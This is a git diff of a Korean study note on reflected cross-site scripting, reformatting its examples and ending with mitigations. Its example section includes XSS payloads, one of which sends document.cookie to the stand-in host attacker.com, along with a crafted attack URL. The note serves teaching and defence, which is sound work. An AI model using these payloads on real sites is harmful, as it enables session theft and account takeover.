@@ -1,6 +1,7 @@
 # XSS (Reflected)
 
 ## 개요
+
 - XSS(Cross-Site Scripting)는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 피해자의 브라우저에서 실행되도록 하는 취약점입니다.
 - Reflected XSS는 악성 스크립트가 서버에 저장되지 않고,  
   URL 파라미터나 입력값에 삽입된 스크립트가 서버 응답에 그대로 반사되어 실행되는 방식입니다.
@@ -18,6 +19,7 @@
 ---
 
 ## 핵심 개념
+
 - 사용자 입력값이 HTML 응답에 인코딩 없이 그대로 포함될 때 발생합니다.
 - 공격자는 악성 스크립트가 담긴 URL을 만들어 피해자에게 전달합니다.
 - 피해자가 해당 URL을 클릭하면 브라우저가 응답하는 과정에서 스크립트가 실행됩니다.
@@ -26,6 +28,7 @@
 ---
 
 ## 공격 방식 설명
+
 - 입력값에 `<script>`, `<img>`, `<a>` 등의 HTML 태그와 스크립트를 삽입합니다.
 - 서버가 입력값을 검증 없이 응답 페이지에 포함하면 브라우저가 이를 스크립트로 해석하여 실행합니다.
 - 주요 악용 사례는 쿠키 탈취, 세션 하이재킹 등입니다.
@@ -33,28 +36,33 @@
 ---
 
 ## 예시
-- 정상 입력  
-  → hello  
-  → user01  
- 
-- 공격 입력  
-  → `<script>alert('XSS')</script>`  
-  → `<script>document.location='http://attacker.com?c='+document.cookie</script>`  
-  → `<img src=x onerror=alert('XSS')>`  
-  → `<a href="javascript:alert('XSS')">클릭</a>`
 
-- 웹 입력 예시
-  → 검색창에 `<script>alert('XSS')</script>` 입력 시  
-  → 서버가 검색어를 응답 페이지에 그대로 포함하면  
-  → 브라우저에서 alert 팝업이 실행됨  
+- 정상 입력
+```
+hello
+user01
+```
 
-- 공격 URL 예시  
-  → `http://target.com/search?q=<script>document.location='http://attacker.com?c='+document.cookie</script>`  
-  → 피해자가 해당 링크 클릭 시 쿠키 정보가 공격자 서버로 전송됨
+- 공격 입력
+```html
+<script>alert('XSS')</script>                                                  -- 기본 스크립트 실행
+<script>document.location='http://attacker.com?c='+document.cookie</script>    -- 쿠키 탈취 후 공격자 서버로 전송
+<img src=x onerror=alert('XSS')>                                               -- 이벤트 핸들러 우회
+<a href="javascript:alert('XSS')">클릭</a>                                     -- javascript: 프로토콜 우회
+```
+
+- 공격 URL 예시
+```
+http://target.com/search?q=<script>document.location='http://attacker.com?c='+document.cookie</script>
+
+-- 피해자가 해당 링크 클릭 시 쿠키 정보가 공격자 서버로 전송됨
+
+```
 
 ---
 
 ## 특징
+
 - 서버에 저장되지 않아 로그에 잘 남지 않습니다.
 - 피해자의 세션 쿠키를 탈취해 계정을 빼앗을 수 있습니다.
 - 악성 URL을 이메일이나 메신저로 전달하는 피싱 공격과 함께 쓰입니다.
@@ -64,6 +72,7 @@
 ---
 
 ## 대응 방안
+
 - 사용자 입력값을 HTML에 출력할 때 HTML 인코딩을 적용합니다.  
   (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`)
 - `<script>`, `onerror`, `javascript:` 등 위험 태그 및 속성을 필터링합니다.
@@ -75,6 +84,7 @@
 ---
 
 ## 정리
+
 - XSS (Reflected)는 사용자 입력값이 서버 응답에 반사되어 피해자 브라우저에서 스크립트가 실행되는 취약점입니다.
 - 세션 탈취, 피싱, 키로깅 등 2차 공격으로 이어질 수 있어 위험도가 높습니다.
 - HTML 인코딩과 CSP 적용이 핵심 대응 방법입니다.
